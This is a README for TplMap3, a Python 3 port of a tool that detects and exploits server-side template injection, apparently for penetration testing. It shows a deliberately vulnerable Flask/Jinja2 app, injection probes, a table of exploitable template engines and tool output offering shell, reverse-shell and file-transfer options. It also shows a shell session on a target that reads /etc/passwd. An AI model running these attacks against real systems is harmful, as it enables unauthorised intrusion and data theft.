Tplmap3
======

[![made-with-python](http://forthebadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
[![built-with-love](http://forthebadge.com/images/badges/built-with-love.svg)](https://gitHub.com/TheWation/)

## What Changed ?
While `tplmap` is considered `abandoned`, it still functions effectively.

I've taken the initiative to update the project to Python 3 to ensure its compatibility with the latest language version. Although the project is not actively maintained, I've addressed the necessary changes for Python 3 support.

if any issues arise, I commit to maintaining and resolving them in the future. Contributions from the community are welcome, and I appreciate any efforts to keep this project functional and relevant.

## Ensuring Trust in TplMap3:

The evolution of TplMap3 from its predecessor, Tplmap by epinna/tplmap, includes a Python 3 upgrade with a paramount focus on transparency.

we invite users to scrutinize the detailed commit history that serves as a transparent record of the changes we made.

## What is TplMap3
Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.

The tool and its test suite are developed to research the SSTI vulnerability class and to be used as offensive security tool during web application penetration tests.


## Prerequisites

- Python 3.7 or later
- `pip` package manager


## Installation

### 1. Clone this repository:

```bash
git clone https://github.com/TheWation/TplMap3.git
```

```bash
cd TplMap3
```

### 2. Install the required dependencies:
```
pip install -r requirements.txt
```

## 

The sandbox break-out techniques came from James Kett's [Server-Side Template Injection: RCE For The Modern Web App][10], other public researches [\[1\]][1] [\[2\]][2], and original contributions to this tool [\[3\]][3] [\[4\]][4].

It can exploit several code context and blind injection scenarios. It also supports _eval()_-like code injections in Python, Ruby, PHP, Java and generic unsandboxed template engines.

Server-Side Template Injection
------------------------------

Assume that you are auditing a web site that generates dynamic pages using templates composed with user-provided values, such as this web application written in Python and [Flask][12] that uses [Jinja2][11] template engine in an unsafe way.

```python
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
Jinja2 = Environment()

@app.route("/page")
def page():

    name = request.values.get('name')
    
    # SSTI VULNERABILITY
    # The vulnerability is introduced concatenating the
    # user-provided `name` variable to the template string.
    output = Jinja2.from_string('Hello ' + name + '!').render()
    
    # Instead, the variable should be passed to the template context.
    # Jinja2.from_string('Hello {{name}}!').render(name = name)

    return output

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

From a black box testing perspective, the page reflects the value similarly to a XSS vulnerability, but also computes basic operation at runtime disclosing its SSTI nature.

```
$ curl -g 'http://www.target.com/page?name=John'
Hello John!
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

Exploitation
------------

Tplmap is able to detect and exploit SSTI in a range of template engines to get access to the underlying file system and operating system. Run it against the URL to test if the parameters are vulnerable.

```
$ ./tplmap.py -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files
```

Use `--os-shell` option to launch a pseudo-terminal on the target.

```
$ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Run commands on the operating system.

linux $ whoami
www
linux $ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

Supported template engines
--------------------------

Tplmap supports over 15 template engines, unsandboxed template engines and generic _eval()_-like injections.

| Engine                 | Remote Command Execution |  Blind | Code evaluation | File read | File write |
|------------------------|---------------|-------------------|-----------------|-----------|------------|
| Mako                   | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Jinja2                 | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Python (code eval)     | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Tornado                | ✓ |  ✓                | Python          |  ✓        |  ✓         |
| Nunjucks               | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Pug                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| doT                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Marko                  | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| JavaScript (code eval) | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Dust (<= dustjs-helpers@1.5.0) | ✓ |  ✓        | JavaScript      |  ✓        |  ✓         |
| EJS                    | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
| Ruby (code eval)       | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| Slim                   | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| ERB                    | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
| Smarty (unsecured)     | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| PHP (code eval)        | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| Twig (<=1.19)          | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
| Freemarker             | ✓ |  ✓                | Java            |  ✓        |  ✓         |
| Velocity               | ✓ |  ✓                | Java            |  ✓        |  ✓         |
| Twig (>1.19)           | × | ×                 | ×               | ×         | ×          |
| Smarty (secured)       | × | ×                 | ×               | ×         | ×          |
| Dust (> dustjs-helpers@1.5.0) | × | ×          | ×               | ×         | ×          |


Burp Suite Plugin
-----------------

See [burp_extension/README.md](burp_extension/README.md).

[10]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[3]: https://github.com/epinna/tplmap/issues/9
[4]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[1]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
[11]: http://jinja.pocoo.org/
[12]: http://flask.pocoo.org/
[2]: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/

## License

`Tplmap` was originally created by epinna/tplmap, and `TplMap3` has been upgraded with ♥ and care by [Wation](https://github.com/TheWation).